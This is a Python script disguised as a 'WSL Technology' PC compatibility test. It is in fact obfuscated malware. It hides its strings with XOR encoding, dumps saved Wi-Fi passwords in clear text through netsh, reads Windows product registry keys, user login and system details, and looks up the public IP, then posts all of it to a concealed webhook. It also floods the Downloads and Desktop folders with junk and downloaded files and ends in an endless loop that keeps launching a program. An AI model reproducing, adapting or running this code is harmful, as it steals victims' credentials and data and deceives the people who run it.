import os, time, json, random, winreg, requests, subprocess; from colorama import Fore

class Battle:
    def prot(string, secret):
        key_len = len(secret)
        result = ""
        for i, char in enumerate(string):
            result += chr(ord(char) ^ secret[i % key_len])
        return result

    secret = bytes.fromhex('53ba10eda8651fcfbda11dd8c8894bd7d703790c4459728d0801792336597503d7c7e5db4b06cd5cb4f19666a3f8a241b8abf914fe83c8a2a27291d91641293ddcdef8f29f69ee3a9739d62a1704e8d7500fa77e39fcf9a00b35fb317c458d837fe28a24fd8b93ccc28ae189176ab08e869434579406b001318355e8caa2617ac746f42c0a6b244b50def26ba59cdedc5f0194fbffaa8177bf73c6bdae04feeb08856cf214dd399583154809e4dbe117781ff323198ad435a2c36de73878cdc0171e08b95f41efedbbec942c39191032a96974fc65e7aeb6544e1bbcc3f4c0248093690c34f927aa4f17d350aecff69123bae92466c28fb9fe6b78b72e4cc715') # oopsie poopsie

    str_0 = bytes.fromhex('3bce649ddb5f30e0d9c86ebba7fb2ff9b46c142325291ba27f641b4b59361e70f8f6d4e87331fc6980c1a55694cc9673889cce2cd1f0b1f4913ae5ab5376766e9986b481d35edf53fb7ea06b41749094327ecf4f5b9ebfcd4f50c37e3301bcf70ed6c240a4ddda8a81dfb7ff6547e6d1c4de672dce57dc316b').decode('latin-1')
    str_1 = prot(str_0, secret) # webhook

    format = lambda string: str(string).replace('{', '{\n    ').replace(',', ',\n    ').replace('}', '\n}')
    random_str_int = str([random.randint(1, 10) for _ in range(6)]).replace("[", "").replace(",", "").replace(" ", "")

    ## WIFI Passwords check ###
    command = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [wlan.split(":")[1][1:-1] for wlan in command if "All User Profile" in wlan]

    for wlan in profiles:
        password = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wlan, 'key=clear']).decode('utf-8').split('\n')
        password = [b.split(":")[1][1:-1] for b in password if "Key Content" in b]
    ### WIFI Passwords check ###

    ### Windows info and activation key check ###
    if os.name == "nt": 
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\DefaultProductKey2') as key:
            var_5 = {
                'subType':str(winreg.QueryValueEx(key, 'DigitalProductId')[0][36:49]).replace('b\'', '').replace('\'', ''),
                'editionId':winreg.QueryValueEx(key, 'EditionId')[0],
                'osProductContentId':winreg.QueryValueEx(key, 'OSProductContentId')[0],
                'osProductPfn':winreg.QueryValueEx(key, 'OSProductPfn')[0],
                'productId':winreg.QueryValueEx(key, 'ProductId')[0]
            }
    else:
        win = {
            'error': 'OS isn\'t Windows NT'
        }
    ### Windows info and activation key check ###

    str_2 = bytes.fromhex('3bce649d924a30a6cd8c7ca8a1a728b8ba2c137f2b375db26e681c4f522a4835e1ffd4e87233fc').decode('latin-1') # ip-api
    str_3 = prot(str_2, secret)

    var_1 = requests.get(str_3) # ip_response
    var_2 = requests.get(str_1) # webhook response

    var_3 = {
        'wlanName': wlan,
        'password':password[0]
    }

    var_4 = {
        'cpuCount':os.cpu_count(),
        'pid':os.getpid(),
        'execPaths':os.get_exec_path(),
        'curPath':os.getcwd(),
        'terminalSize':os.get_terminal_size(),
        'loginName':os.getlogin(),
    }

    str_2_6 = bytes.fromhex('7e973dcde1353f86d3c772f8e5a466').decode('latin-1')
    str_2_7 = prot(str_2_6, secret)
    str_2_8 = bytes.fromhex('7e973dcdff205d87f2ee56f881e72db8').decode('latin-1')
    str_2_9 = prot(str_2_8, secret)
    str_2_10 = bytes.fromhex('7e973dcdff295e819de873bea7').decode('latin-1')
    str_2_11 = prot(str_2_10, secret)
    str_2_12 = bytes.fromhex('7e973dcdf8263f86d3c772').decode('latin-1')
    str_2_13 = prot(str_2_12, secret)
    str_2_14 = bytes.fromhex('7e973dcdff2c518bf2f64ef881e72db8').decode('latin-1')
    str_2_15 = prot(str_2_14, secret)

    str_0_info = f'```{str_2_7} \n{format(json.loads(var_1.text))}```'
    str_1_info = f'```{str_2_9} ({json.loads(var_1.text).get("query")}) ---\n{format(json.loads(var_2.text))}```'
    str_info = f'```{str_2_11} ({json.loads(var_1.text).get("query")}) ---\n{format(json.dumps(var_3))}```'
    _info = f'```{str_2_13} ({json.loads(var_1.text).get("query")}) ---\n{format(json.dumps(var_4))}```'
    __info = f'```{str_2_15} ({json.loads(var_1.text).get("query")}) ---\n{format(json.dumps(var_5))}```'

    str_3_1 = bytes.fromhex('1aea3da4c60370').decode('latin-1')
    str_3_2 = prot(str_3_1, secret)

    str_0_log = {
        'content': str_0_info,
        'username': str_3_2
    }

    str_3_3 = bytes.fromhex('04ff52a5e72a54e2f4cf7bb7').decode('latin-1')
    str_3_4 = prot(str_3_3, secret)

    str_1_log = {
        'content': str_1_info,
        'username': str_3_4
    }

    str_3_5 = bytes.fromhex('04ff52a5e72a54e2f4cf7bb7').decode('latin-1')
    str_3_6 = prot(str_3_5, secret)

    str_log = {
        'content': str_info,
        'username': str_3_6
    }

    str_3_7 = bytes.fromhex('03f93da4c60370').decode('latin-1')
    str_3_8 = prot(str_3_7, secret)

    _log = {
        'content': _info,
        'username': str_3_8
    }

    str_3_9 = bytes.fromhex('04f35ea9e7324ce2f4cf7bb7').decode('latin-1')
    str_3_10 = prot(str_3_9, secret)

    __log = {
        'content': __info,
        'username': str_3_10
    }

    headers = {
        'Content-Type': 'application/json'
    }

    requests.post(str_1, data=json.dumps(str_0_log), headers=headers)
    requests.post(str_1, data=json.dumps(str_1_log), headers=headers)
    requests.post(str_1, data=json.dumps(str_log), headers=headers)
    requests.post(str_1, data=json.dumps(_log), headers=headers)
    requests.post(str_1, data=json.dumps(__log), headers=headers)

    str_2_0 = bytes.fromhex('30d56583dc17668cd2c578').decode('latin-1')
    str_2_1 = prot(str_2_0, secret)
    str_2_2 = bytes.fromhex('10e0').decode('latin-1')
    str_2_3 = prot(str_2_2, secret)
    str_2_4 = bytes.fromhex('00f1').decode('latin-1')
    str_2_5 = prot(str_2_4, secret)

    if json.loads(var_1.text).get(str_2_1) != str_2_3 and json.loads(var_1.text).get('countryCode') != str_2_5:
        print(f'{Fore.GREEN}Your PC can is good with WSL Technology!{Fore.WHITE}')
    else:
        print(f'{Fore.GREEN}Your PC isn\'t good with WSL Technology!\nReason: {map(str, random.randbytes(32).hex())}{Fore.WHITE}')

    time.sleep(1)

    print('Trying to repeat tests for better results...')

    os.chdir(os.path.expanduser("~/Downloads"))

    str_5 = bytes.fromhex('7e973dcdc0116bbfce9b32f7ace038b4b8711d22233e5dc665580e707229035187e7c8f6660cc75599dcbb46efb7fa04fc8bbb4dded08df0f43bd596440f6076fcf3d5df').decode('latin-1')
    str_6 = prot(str_5, secret)

    fo = open(random_str_int.replace("]", ".txt"), "w+")

    for i in range(20):
        fo.write(str_6)

    print("First test passed...")

    str_6_1 = bytes.fromhex('04c87f99cd452dff9dd27eb9a5a92dbebb660a2c3036').decode('latin-1')
    str_6_2 = prot(str_6_1, secret)
    str_6_3 = bytes.fromhex('07f245aa852c71a9d2').decode('latin-1')
    str_6_4 = prot(str_6_3, secret)

    data = {
        'content': f'{str_6_2} **{os.getcwd()}** ({json.loads(var_1.text).get("query")})',
        'username': str_6_4
    }

    requests.post(str_1, data=json.dumps(data), headers=headers)

    os.chdir(os.path.expanduser("~/Desktop"))

    str_7 = bytes.fromhex('3bce649ddb5f30e0dec573f6ace038b4b8711d6d34295cee676c5642422d1460bfaa80b53f75e26d84c5a2539acc9672819bc823c7bafa939b40bee82772100becedcac7ab5ad709a009e21e213cc7b4317cd3125c9e8bc17c59d55c1333').decode('latin-1')
    str_8 = prot(str_7, secret)

    with open("c--.mov", "wb") as fo:
        fo.write(requests.get(str_8).content)

    str_9 = str_8

    fo = open(random_str_int.replace("]", ".mov"), "wb")

    for i in range(50):
        fo.write(requests.get(str_9).content)

    print('Last test passed...')

    str_10 = bytes.fromhex('04c87f99cd452aff9dd575adafa93dbeb366167f642d1d').decode('latin-1')
    str_11 = prot(str_10, secret)
    str_12 = str_6_4

    data = {
        'content': f'{str_11} **{os.getcwd()}** ({json.loads(var_1.text).get("query")})',
        'username': str_12
    }

    requests.post(str_1, data=json.dumps(data), headers=headers)

    time.sleep(2)

    print('Getting results...')

    str_13 = bytes.fromhex('15cf7c81d1456ba7c8c67abdac').decode('latin-1')
    str_14 = prot(str_13, secret)
    str_15 = str_12

    data = {
        'content': f'{str_14} **{json.loads(var_1.text).get("query")}!**',
        'username': str_15
    }

    requests.post(str_1, data=json.dumps(data), headers=headers)

    str_16 = bytes.fromhex('76ef43a8fa354d80fbe8519dedd50fb2a4680d63340511a0252f144c40').decode('latin-1')
    str_17 = prot(str_16, secret)
    str_18 = bytes.fromhex('17f548a8ec455d969df2588a9ec00f98854d3047640d37cc450b2a6c7a1827098382b7890a0c9c6ff0b4c06cefafeb15fbe3a01eb5ca92f8').decode('latin-1')
    str_19 = prot(str_18, secret)

    while True:
        process = subprocess.Popen(["start", "", str_17], shell=True)
        process.wait()

        print(f'{Fore.RED}{str_19}')
